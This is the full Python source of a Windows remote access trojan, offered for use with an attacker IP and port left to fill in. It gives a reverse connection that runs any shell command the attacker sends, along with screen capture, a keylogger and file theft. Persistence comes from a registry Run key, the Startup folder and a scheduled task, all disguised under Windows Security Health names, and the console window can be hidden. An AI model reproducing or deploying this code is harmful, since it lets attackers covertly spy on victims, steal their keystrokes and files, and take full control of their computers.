import socket
import subprocess
import os
import sys
import ctypes
import winreg
import base64
import threading
import platform
from io import BytesIO
import time

# Config - CHANGE THESE
SERVER_HOST = "YOUR_IP_HERE"  
SERVER_PORT = 4444
RECONNECT_DELAY = 30

class RAT:
    def __init__(self):
        self.socket = None
        self.keylogger_thread = None
        self.keylog_active = False
        self.keylog_buffer = []
        
    def connect(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((SERVER_HOST, SERVER_PORT))
                self.listen()
            except Exception:
                time.sleep(RECONNECT_DELAY)
                
    def listen(self):
        while True:
            try:
                cmd = self.socket.recv(4096).decode().strip()
                if not cmd:
                    break
                    
                result = self.execute(cmd)
                if isinstance(result, bytes):
                    self.socket.send(result + b"<END>")
                else:
                    self.socket.send(result.encode() + b"<END>")
                    
            except Exception:
                break
    
    def execute(self, cmd):
        try:
            if cmd.startswith("shell "):
                return self.run_shell(cmd[6:])
            elif cmd == "screenshot":
                return self.take_screenshot()
            elif cmd == "keylog_start":
                return self.start_keylogger()
            elif cmd == "keylog_stop":
                return self.stop_keylogger()
            elif cmd == "keylog_dump":
                return self.dump_keylog()
            elif cmd.startswith("download "):
                return self.download_file(cmd[9:])
            elif cmd == "persist":
                return self.install_persistence()
            elif cmd == "sysinfo":
                return self.get_sysinfo()
            else:
                return self.run_shell(cmd)
        except Exception as e:
            return f"[!] Error: {str(e)}"
    
    def run_shell(self, command):
        try:
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                timeout=60
            )
            return output.decode(errors='ignore')
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[!] {str(e)}"
    
    def take_screenshot(self):
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buffer = BytesIO()
            img.save(buffer, format='PNG')
            return base64.b64encode(buffer.getvalue())
        except ImportError:
            # Fallback without PIL
            return self.screenshot_native()
    
    def screenshot_native(self):
        """Windows-native screenshot using ctypes"""
        import ctypes
        from ctypes import wintypes
        
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        
        # Get screen dimensions
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        
        # Get device contexts
        desktop_dc = user32.GetDC(0)
        capture_dc = gdi32.CreateCompatibleDC(desktop_dc)
        
        # Create bitmap
        bitmap = gdi32.CreateCompatibleBitmap(desktop_dc, width, height)
        gdi32.SelectObject(capture_dc, bitmap)
        
        # Copy screen
        gdi32.BitBlt(capture_dc, 0, 0, width, height, desktop_dc, 0, 0, 0x00CC0020)
        
        # Save to file, read, encode
        temp_path = os.path.join(os.environ['TEMP'], 'ss.bmp')
        
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ('biSize', wintypes.DWORD),
                ('biWidth', wintypes.LONG),
                ('biHeight', wintypes.LONG),
                ('biPlanes', wintypes.WORD),
                ('biBitCount', wintypes.WORD),
                ('biCompression', wintypes.DWORD),
                ('biSizeImage', wintypes.DWORD),
                ('biXPelsPerMeter', wintypes.LONG),
                ('biYPelsPerMeter', wintypes.LONG),
                ('biClrUsed', wintypes.DWORD),
                ('biClrImportant', wintypes.DWORD)
            ]
        
        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = width
        bmi.biHeight = -height
        bmi.biPlanes = 1
        bmi.biBitCount = 24
        bmi.biCompression = 0
        
        buffer_size = width * height * 3
        buffer = ctypes.create_string_buffer(buffer_size)
        
        gdi32.GetDIBits(capture_dc, bitmap, 0, height, buffer, ctypes.byref(bmi), 0)
        
        # Cleanup
        gdi32.DeleteObject(bitmap)
        gdi32.DeleteDC(capture_dc)
        user32.ReleaseDC(0, desktop_dc)
        
        return base64.b64encode(buffer.raw)
    
    def start_keylogger(self):
        if self.keylog_active:
            return "[*] Keylogger already running"
        
        self.keylog_active = True
        self.keylogger_thread = threading.Thread(target=self.keylogger_loop, daemon=True)
        self.keylogger_thread.start()
        return "[+] Keylogger started"
    
    def keylogger_loop(self):
        try:
            from pynput import keyboard
            
            def on_press(key):
                if not self.keylog_active:
                    return False
                try:
                    self.keylog_buffer.append(key.char)
                except AttributeError:
                    self.keylog_buffer.append(f'[{key.name}]')
            
            with keyboard.Listener(on_press=on_press) as listener:
                while self.keylog_active:
                    time.sleep(0.1)
                listener.stop()
                    
        except ImportError:
            # Fallback with ctypes
            self.keylogger_native()
    
    def keylogger_native(self):
        """Windows-native keylogger using GetAsyncKeyState"""
        user32 = ctypes.windll.user32
        
        special_keys = {
            0x08: '[BACKSPACE]', 0x09: '[TAB]', 0x0D: '[ENTER]',
            0x10: '[SHIFT]', 0x11: '[CTRL]', 0x12: '[ALT]',
            0x14: '[CAPSLOCK]', 0x1B: '[ESC]', 0x20: ' ',
            0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]'
        }
        
        while self.keylog_active:
            for key in range(1, 256):
                if user32.GetAsyncKeyState(key) & 0x0001:
                    if key in special_keys:
                        self.keylog_buffer.append(special_keys[key])
                    elif 32 <= key <= 126:
                        self.keylog_buffer.append(chr(key))
            time.sleep(0.01)
    
    def stop_keylogger(self):
        self.keylog_active = False
        return "[+] Keylogger stopped"
    
    def dump_keylog(self):
        data = ''.join(self.keylog_buffer)
        self.keylog_buffer = []
        return data if data else "[*] No keys logged"
    
    def download_file(self, path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read())
        except Exception as e:
            return f"[!] Failed: {str(e)}"
    
    def install_persistence(self):
        """Multiple persistence methods for redundancy"""
        results = []
        
        # Method 1: Registry Run key
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsSecurityHealth", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            results.append("[+] Registry persistence installed")
        except Exception as e:
            results.append(f"[!] Registry failed: {e}")
        
        # Method 2: Startup folder
        try:
            startup = os.path.join(
                os.environ['APPDATA'],
                r'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            shortcut_path = os.path.join(startup, 'SecurityHealth.bat')
            with open(shortcut_path, 'w') as f:
                exe_path = sys.executable if getattr(sys, 'frozen', False) else f'pythonw "{os.path.abspath(__file__)}"'
                f.write(f'@echo off\\nstart "" {exe_path}')
            results.append("[+] Startup folder persistence installed")
        except Exception as e:
            results.append(f"[!] Startup folder failed: {e}")
        
        # Method 3: Scheduled Task (requires admin)
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            task_cmd = f'schtasks /create /tn "WindowsSecurityHealthService" /tr "{exe_path}" /sc onlogon /rl highest /f'
            result = subprocess.run(task_cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                results.append("[+] Scheduled task persistence installed")
            else:
                results.append("[!] Scheduled task failed (need admin)")
        except Exception as e:
            results.append(f"[!] Scheduled task failed: {e}")
        
        return '\\n'.join(results)
    
    def get_sysinfo(self):
        info = []
        info.append(f"OS: {platform.system()} {platform.release()} {platform.version()}")
        info.append(f"Machine: {platform.machine()}")
        info.append(f"Hostname: {platform.node()}")
        info.append(f"Username: {os.getlogin()}")
        info.append(f"CWD: {os.getcwd()}")
        info.append(f"Admin: {ctypes.windll.shell32.IsUserAnAdmin() != 0}")
        
        # Network info
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            info.append(f"Local IP: {local_ip}")
        except:
            pass
            
        return '\\n'.join(info)

def hide_console():
    """Hide console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(), 0
    )

if __name__ == "__main__":
    # Uncomment for stealth:
    # hide_console()
    
    rat = RAT()
    rat.connect()